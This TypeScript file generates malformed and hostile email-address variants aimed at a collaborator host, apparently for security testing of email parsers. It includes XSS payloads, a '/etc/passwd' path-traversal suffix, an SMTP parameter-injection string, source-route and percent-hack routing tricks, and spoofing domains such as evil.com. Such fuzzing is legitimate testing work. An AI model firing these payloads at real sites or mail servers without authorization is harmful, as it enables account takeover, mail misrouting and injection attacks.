// Helper function to simulate Python's btoa for ASCII
const b64encode = (str: string): string => {
    try {
        return btoa(str);
    } catch (e) {
        console.error("Failed to base64 encode:", str, e);
        return "";
    }
};

const encodedWord = (charset: string, encoding: string, encodedText: string): string => {
  return `=?${charset}?${encoding}?${encodedText}?=`;
};

// Simplified Punycode/IDNA encoding based on the examples in the script.
// A full IDNA implementation is complex and out of scope.
const punycode = (domain: string): string => {
    const map: { [key: string]: string } = {
        "exämple": "xn--exmple-cua",
        "例子": "xn--fsqu00a",
        "пример": "xn--e1afmkfd",
        "münchen": "xn--mnchen-3ya"
    };
    return map[domain] || domain; // Return punycode if found, otherwise original
};

const unicodeOverflow = (char: string): string[] => {
    const overflows: string[] = [];
    const bases = [0x100, 0x1000, 0x10000, 0x10ffff]; 
    for (const base of bases) {
        const codepoint = base + char.charCodeAt(0);
        try {
            if (codepoint <= 0x10FFFF) {
                overflows.push(String.fromCodePoint(codepoint));
            }
        } catch (e) {
            // Ignore range errors for invalid code points
        }
    }
    return overflows;
};

export const generateEmailVariants = (collaborator: string, targetDomain: string): string[] => {
    const variants: string[] = [];
    const effectiveTarget = targetDomain || 'example.com';
    
    // --- RFC-compliant basics & common cases ---
    variants.push(
        `user@${collaborator}`,
        `u.ser@${collaborator}`,
        `user+tag@${collaborator}`,
        `user_name@${collaborator}`,
        `user-name@${collaborator}`,
        `"user"@${collaborator}`,
        `"user.name"@${collaborator}`,
        `user@${collaborator}`.toUpperCase(),
        `user@[127.0.0.1]`,
        `user@[IPv6:2001:db8::1]`,
        `user@localhost`,
        `user@${collaborator}.evil.com`,
        `user@subdomain.${collaborator}`,
        `user@.com`,
        `user@-domain.com`,
        `user@domain-with-dash-.com`,
        `user@domain_with_underscore.com`,
        `user@domain!.com`,
        `user@${collaborator}/`,
        `user@${collaborator}\\`,
        `user@${collaborator}#`,
        `user@${collaborator}?`,
        `user@${collaborator}&`,
        `user@${collaborator}=`,
        `user..test@${collaborator}`,
        `user%2Etest@${collaborator}`,
        `user@${collaborator}/../../etc/passwd`,
        `@${collaborator}`,
        `userexample.com`,
        `" "@${collaborator}`,
        `user@ ${collaborator}`,
        `user @${collaborator}`,
        `user@@${collaborator}`,
        `user@sub@${collaborator}`,
        `user(comment)@${collaborator}`,
        `(foo)user@(bar)${collaborator}`,
    );
    
    // --- Quoted and escaped ---
    variants.push(
        `"@"@${collaborator}`,
        `"\\""@${collaborator}`,
        `"user\\@name"@${collaborator}`,
        `"user\\"@${collaborator}"`,
    );
    
    // --- Encoded-word RFC 2047/6532 ---
    variants.push(
        encodedWord("UTF-8", "B", b64encode("user")) + `@${collaborator}`,
        encodedWord("UTF-8", "Q", "user") + `@${collaborator}`,
        encodedWord("UTF-7", "Q", "user+Example") + `@${collaborator}`,
        encodedWord("UTF-7", "B", b64encode("UserExample")) + `@${collaborator}`,
        encodedWord("x", "q", "=40=3e=00") + `@${collaborator}`,
        encodedWord("x", "b", b64encode("foobar")) + `@${collaborator}`,
    );

    // --- Unicode/Punycode ---
    const unicodeDomains = ["exämple", "例子", "пример", "münchen"];
    for (const dom of unicodeDomains) {
        variants.push(`user@${dom}.${collaborator}`);
        variants.push(`user@${punycode(dom)}.${collaborator}`);
    }

    // --- Malformed Punycode/IDN ---
    variants.push(
        `foo@xn--0049.${collaborator}`,
        `foo@xn--0117.${collaborator}`,
        `x@xn--42.${collaborator}`,
        `x@xn--024.${collaborator}`,
        `x@xn--694.${collaborator}`,
        `x@xn--svg/-9x6.${collaborator}`,
        `x@xn--svg/-f18.${collaborator}`,
        `x@xn--svg/-fq1.${collaborator}`,
    );

    // --- Source routes, UUCP, percent hack (old/rare but risky) ---
    variants.push(
        `!#$%&'*+\\/_?^~\`{|}~-${collaborator}\\@psres.net`,
        `oastify.com!${collaborator}\\@${effectiveTarget}`,
        `collab%psres.net(@${effectiveTarget}`,
        `foo%psres.net@${effectiveTarget}`,
        `foo@psres.net`,
        `"foo\\"@${collaborator}> ORCPT=test;admin"@${effectiveTarget}`,
        `"psres.net!${collaborator}"(\\"@${effectiveTarget}`,
        `collab%psres.net@[127.0.0.1]`,
    );

    // --- Unicode overflow ---
    const overflowChars = ['@', '(', ')', ';', '<', '=', '>', '\x00'];
    for (const ch of overflowChars) {
        for (const u of unicodeOverflow(ch)) {
            variants.push(`user${u}${collaborator}`);
        }
    }

    // --- Spoofing, splitting, double domain ---
    variants.push(
        `user@${collaborator}@evil.com`,
        `user@${collaborator}.evil.com`,
        `user@evil@${collaborator}`,
        `user@${collaborator}..evil.com`,
        `user@${collaborator}..`,
    );

    // --- Injection/Payloads, CSS, JS, HTML ---
    variants.push(
        `<img src=x onerror=alert(1)>@${collaborator}`,
        `<svg onload=alert(1)>@${collaborator}`,
        `user@${collaborator}<!--css-->`,
        `user@${collaborator}/*css*/`,
        `user@${collaborator}<script>alert(document.domain)</script>`,
        `user@${collaborator}<a href=x onmouseover=alert(1)>`,
        `user@${collaborator}<!--comment-->`,
        `user@${collaborator}%00`,
    );

    // --- Spaces/tabs ---
    variants.push(
        `user @ ${collaborator}`,
        `user@ ${collaborator}`,
        `user\t@${collaborator}`,
        `user@${collaborator}\t`,
        `user @ ${collaborator} `,
        `user @\t${collaborator}`,
    );

    // --- Invalid formats (for negative testing) ---
    variants.push(
        `user${collaborator}`,
        `user@.`,
        `@${collaborator}`,
        `user@-`,
        `user@_`,
    );
    
    // --- Bonus case: encoded-word in name field with angle brackets ---
    variants.push(encodedWord("utf8", "q", "=61=62=63") + `<${collaborator}>`);
    
    // --- Remove duplicates and sort ---
    return [...new Set(variants)].sort();
};